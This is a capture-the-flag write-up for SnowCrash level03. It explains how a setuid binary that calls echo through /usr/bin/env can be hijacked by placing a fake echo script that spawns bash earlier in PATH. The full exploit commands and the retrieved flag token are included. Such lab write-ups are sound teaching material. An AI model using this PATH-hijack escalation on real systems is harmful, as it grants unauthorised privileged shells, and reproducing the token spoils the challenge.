# Level03 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit a setuid binary to gain access to the `flag03` account and retrieve the password token.

## Vulnerability
PATH manipulation in setuid binary executing `/usr/bin/env` without absolute path to echo.

## Exploitation

### The Binary
The `level03` binary is a setuid executable owned by `flag03`:
```
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

When executed, it runs with `flag03` privileges (UID/GID).

### The Vulnerability: PATH Manipulation

The binary executes via `system()`:
```c
system("/usr/bin/env echo Exploit me");
```

**Why it's vulnerable:**
1. `/usr/bin/env` searches for `echo` in the user's `PATH` environment variable
2. The `system()` function spawns `/bin/sh` which respects `PATH`
3. User can modify `PATH` to search attacker-controlled directories first
4. No absolute path to `echo` (would be `/bin/echo`)

### Exploit Steps

#### Step 1: Create Exploit Directory on Remote Host
```bash
mkdir -p /tmp/level03_exploit
```

#### Step 2: Create Malicious Echo Script
```bash
echo '#!/bin/bash' > /tmp/level03_exploit/echo
echo '/bin/bash' >> /tmp/level03_exploit/echo
chmod +x /tmp/level03_exploit/echo
```

This fake `echo` launches a bash shell instead of echoing text.

#### Step 3: Execute Setuid Binary with Modified PATH
```bash
export PATH=/tmp/level03_exploit:$PATH && ~/level03 <<< 'getflag'
```

**Execution Flow:**
1. Binary calls `system("/usr/bin/env echo Exploit me")`
2. `/bin/sh` searches for `echo` in our modified PATH
3. Finds our malicious script in `/tmp/level03_exploit/echo` first
4. Our script executes with `flag03` privileges
5. Returns bash shell where we run `getflag`

#### Step 4: Retrieve the Flag
The bash shell allows us to run:
```bash
getflag
```

Output:
```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Security Flaws

1. **Insecure use of `system()`**: Commands that depend on PATH are dangerous in setuid programs
2. **No PATH sanitization**: The program doesn't set a safe PATH or use absolute paths
3. **Trust in environment variables**: Setuid programs should never trust user-controlled environment variables like PATH
4. **Use of `/usr/bin/env`**: This utility explicitly searches PATH for commands

## Answer

- **Level03 Token**: `qi0maab88jeaj46qoumi7maus`
- **Vulnerability Type**: PATH manipulation / arbitrary code execution via setuid binary
- **Attack Type**: Privilege escalation through environment variable hijacking
